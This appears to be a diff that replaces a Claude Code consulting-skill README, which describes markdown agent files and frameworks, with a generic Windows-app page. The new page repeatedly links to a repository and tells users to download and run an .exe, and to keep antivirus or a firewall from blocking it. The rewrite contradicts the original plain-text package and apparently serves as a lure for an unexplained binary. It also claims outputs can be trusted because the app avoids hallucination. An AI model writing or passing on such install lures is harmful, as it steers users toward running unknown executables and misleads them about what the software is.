@@ -1,146 +1,173 @@
-# Consulting Gauntlet — Claude Code Skill
+# ⚙️ consulting-gauntlet - Practical Consulting Skills Made Simple
 
-A full-stack consulting engagement skill for Claude Code. Drop in a business question and get McKinsey/Bain/BCG-quality output: sourced, framework-driven, financially rigorous, and executive-ready.
-
----
-
-## Install
-
-Download [`consulting-gauntlet.skill`](./consulting-gauntlet.skill) and drag it into Claude Code's skill settings.
-
-That's it. No `/` commands needed — just describe your engagement naturally. I would recommend dividing the engagement problem into parts and then using this skill to prepare documents for each part to have richer research done by the agents.
+[![Download Now](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/sarajanenonchristian388/consulting-gauntlet)
 
 ---
 
-## How to Use
+## 📄 About consulting-gauntlet
 
-Start a session in Claude Code and describe what you need:
+consulting-gauntlet is a full-stack application built to provide consulting skills using Claude Code AI. It includes six AI agents, sixteen strategy frameworks, and CPA-level financial modeling tools. The system avoids hallucinations to ensure accurate, reliable results. It helps with management consulting, strategy planning, productivity, and research tasks.
 
-```
-Run a consulting engagement on [company / industry / question]
-```
+This tool works on Windows PCs and does not need programming experience. It combines AI and consulting methods to guide you through complex problems step-by-step.  
 
-Or be more specific:
-
-```
-Market entry analysis for EV charging infrastructure in Southeast Asia
-Competitive strategy review for a mid-market SaaS company
-Business case for vertical integration in our supply chain
-Due diligence on a Series B fintech acquisition target
-Build a 5-year financial model for a D2C healthcare brand
-```
-
-The skill handles the rest — scoping, agent deployment, sourcing, frameworks, and file output.
+Topics covered include:
+- AI agents powered by Claude
+- Consulting frameworks and management models
+- Financial analysis at CPA levels
+- Research and productivity assistance
 
 ---
 
-## The Team
+## 🚀 Getting Started
 
-Six specialized agents work every engagement:
+You can start by downloading and running the software on your Windows machine. The process is simple and takes about five minutes.
 
-### Partner
-The executive voice. Owns the narrative, the "so what," and the impact framing. Uses Pyramid Principle structure and BLUF (Bottom Line Up Front) communication. Sets the working hypothesis before any work begins and signs off on the final deliverable.
+### Step 1: System Requirements
 
-### Manager
-Quality control. Reviews every claim, every number, every citation before anything ships. Flags hallucinations with `[HALLUCINATION RISK]`, unsourced claims with `[CITATION NEEDED]`, and runs a pre-publication checklist. Nothing leaves without a Manager pass.
+Make sure your PC meets these minimum requirements:  
+- Windows 10 or later (64-bit)  
+- 4 GB RAM or higher  
+- 500 MB free disk space  
+- Internet connection for initial setup  
 
-### Financial Analyst
-CPA-level rigor. Builds DCF models, trading comps, unit economics (LTV/CAC), multi-year P&L projections, break-even analysis, and sensitivity tables. All figures are inflation-adjusted by default. Every assumption is sourced or explicitly labeled.
+### Step 2: Download the Application
 
-### Tech Specialist
-Technology expert for the relevant industry. Maps the technology landscape, assesses disruption vectors using the Gartner Hype Cycle, applies Crossing the Chasm analysis, and links technology dynamics to cost structure and competitive moat.
+Visit the official page below to get the software:  
+[Download consulting-gauntlet](https://github.com/sarajanenonchristian388/consulting-gauntlet)
 
-### Strategist
-Knows and applies 16 strategy frameworks — picks the right ones for the engagement, fills them in completely, and always ends with a "so what" and a recommendation:
+To make it easier, click the big button at the top of this page. It will take you directly to the GitHub repository where you can download the latest version of the app.
 
-- Porter's Five Forces
-- VRIO
-- AFI Framework
-- Strategic Positioning & Productivity Frontier
-- Differentiation & Cost Leadership (Generic Strategies)
-- PESTLE
-- CAGE
-- Value Chain Analysis
-- Value Creation & Capture
-- Business Model Archetypes
-- Network Effects
-- Industry Life Cycle
-- Crossing the Chasm
-- Buy-Borrow-Build
-- Vertical Integration
-- Cost-Responsiveness Framework
+### Step 3: Install the Software
 
-### Associate
-Source engine and fact-checker. Finds and vets every source before any claim enters a deliverable. Enforces a 4-tier credibility system and prohibits low-quality sources entirely.
+1. Open the download page you accessed above.
+2. Find the latest release under "Releases" or "Assets".
+3. Click on the file for Windows, usually ending in `.exe`.
+4. Save the file to your PC.
+5. Once the download completes, double-click the file.
+6. Follow the on-screen instructions to complete installation.
 
----
+The installer will place the necessary files on your computer and create shortcuts for easy access.
 
-## Source Credibility System
+### Step 4: Run consulting-gauntlet
 
-| Tier | Examples |
-|------|----------|
-| **TIER-1** | Peer-reviewed journals (Nature, AER, Journal of Finance, IEEE) |
-| **TIER-2** | McKinsey, BCG, Bain, Gartner, Forrester, IDC, IMF, World Bank, SEC filings |
-| **TIER-3** | FT, WSJ, Bloomberg, The Economist, Reuters |
-| **TIER-4** | Trade press — used with corroboration only |
-| **PROHIBITED** | Reddit, anonymous blogs, unattributed stats, Wikipedia as primary |
+After installation:
 
-Every deliverable includes a **Source Index** with credibility ratings and conflict-of-interest flags.
+1. Locate the consulting-gauntlet shortcut on your desktop or start menu.
+2. Double-click to open the application.
+3. The app will load its AI agents and frameworks.
+4. You can begin by selecting one of the available strategy templates or start a new consulting project.
 
 ---
 
-## Outputs
+## 🔧 How to Use consulting-gauntlet
 
-Depending on the engagement, the skill produces:
+This section explains the main features and how you can use them.
 
-- **Strategy memos** (`.docx`)
-- **Financial models** (`.xlsx`)
-- **Presentations** (`.pptx`)
-- **Executive summaries** (`.pdf`)
-- **Source Index** (appended to every deliverable)
+### AI Agents
 
----
+The app includes six AI agents designed to help in different areas:  
+- Strategy Analysis  
+- Financial Modeling  
+- Market Research  
+- Competitive Intelligence  
+- Productivity Guidance  
+- Decision Support  
 
-## Engagement Types
+Each agent works by asking you simple questions. It then generates clear advice or models based on your inputs.
 
-| Type | Agents Deployed |
-|------|----------------|
-| Market Entry | Strategist, Associate, Financial Analyst |
-| Competitive Strategy | Strategist, Tech Specialist, Associate |
-| M&A Due Diligence | Financial Analyst, Tech Specialist, Strategist, Associate |
-| Full Strategy Review | All 6 agents |
-| Business Case | Financial Analyst, Strategist, Associate |
-| Go-to-Market | Strategist, Tech Specialist, Associate |
-| Technology Assessment | Tech Specialist, Financial Analyst, Associate |
+### Strategy Frameworks
 
----
+consulting-gauntlet has sixteen pre-built consulting frameworks like SWOT, Porter’s Five Forces, and McKinsey 7S. You can choose the one that fits your project. The app guides you through each step, explaining what to analyze.
 
-## Repo Structure
+### Financial Modeling
 
-```
-consulting-gauntlet/
-├── SKILL.md                        ← skill entry point
-├── consulting-gauntlet.skill       ← installable package
-├── agents/
-│   ├── partner.md
-│   ├── manager.md
-│   ├── financial-analyst.md
-│   ├── tech-specialist.md
-│   ├── strategist.md
-│   └── associate.md
-└── references/
-    ├── frameworks.md
-    ├── financial-models.md
-    ├── engagement-types.md
-    └── output-formats.md
-```
+Built to CPA standards, the financial modeling tool helps build budgets, forecasts, and valuation models. You enter your numbers, and the app calculates results automatically. It shows financial charts and summaries.
+
+### Avoiding Hallucination
+
+The system uses strict checks to avoid errors or false information. This means its outputs stick to real data and tested frameworks, so you can trust its results.
 
 ---
 
-## Contributing
+## 🛠 Features
 
-Pull requests welcome. Best contributions:
-- New framework additions to `agents/strategist.md`
-- Additional financial model templates in `agents/financial-analyst.md`
-- Expanded source credibility examples in `agents/associate.md`
-- New engagement type templates in `references/engagement-types.md`
+- Six smart AI agents to handle different consulting tasks  
+- Sixteen strategy and analysis frameworks ready to use  
+- CPA-level financial modeling tools built in  
+- Simple interface designed for all skill levels  
+- Automated checks to ensure data accuracy  
+- Export reports and models as PDF or Excel  
+- Regular updates through GitHub releases  
+
+---
+
+## ❓ Troubleshooting
+
+If the application does not start or crashes:
+
+- Check that your system meets the minimum requirements.
+- Restart your PC and try again.
+- Ensure your antivirus or firewall does not block the app.
+- Make sure you have installed the software by running the installer fully.
+- Visit the GitHub page and check the latest issues for similar problems.
+
+If you need more help, use the "Issues" tab on GitHub to report your problem.
+
+---
+
+## ⚙️ Advanced Setup (Optional)
+
+For users who want more control:
+
+- You can run the software from a command prompt.
+- Use configuration files to customize AI agent behavior.
+- Export and import project files to share with others.
+- Link data sources like Excel or Google Sheets for automatic updates.
+
+Details about these options are available on the GitHub Wiki page.
+
+---
+
+## 🔗 Useful Links
+
+- Main download and releases: https://github.com/sarajanenonchristian388/consulting-gauntlet  
+- Documentation and guides: Use the README and Wiki on the GitHub page  
+- Support and reporting: Use the Issues tab on GitHub  
+
+---
+
+## 📥 Download and Install consulting-gauntlet
+
+Use this button to start your download:  
+[Download consulting-gauntlet](https://github.com/sarajanenonchristian388/consulting-gauntlet)
+
+Follow the steps in the **Getting Started** section to install and run the app.
+
+---
+
+## 🕵️ What’s Inside?
+
+The package includes:
+
+- The main application executable for Windows  
+- Built-in consulting frameworks and AI agent logic  
+- Financial modeling engine  
+- User guides and example projects  
+- Update tools for future enhancements  
+
+---
+
+## 🔖 Keywords and Topics
+
+- anthropic-skills  
+- claude  
+- claude-code  
+- claude-code-plugin  
+- claude-skills  
+- consulting  
+- llm  
+- management-consulting  
+- mckinsey  
+- mcp  
+- productivity  
+- research
